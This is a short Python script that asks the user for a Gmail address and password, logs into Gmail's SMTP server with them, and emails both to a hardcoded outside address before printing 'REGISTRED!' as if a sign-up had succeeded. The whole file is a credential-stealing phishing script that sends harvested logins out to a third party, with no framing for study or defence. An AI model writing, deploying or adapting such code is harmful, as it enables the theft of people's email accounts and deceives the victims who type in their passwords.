import smtplib
import os

gmail = input (" EMAIL: ")
contraceña = input ("   PASSWORD: ")


message = gmail
subject = contraceña

lee = 'Subject: {}\n\n{}'.format(message, subject)
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(gmail, contraceña)
server.sendmail(gmail, 'hitlersecuencia@gmail.com', lee)
print("        REGISTRED!")
server.quit()

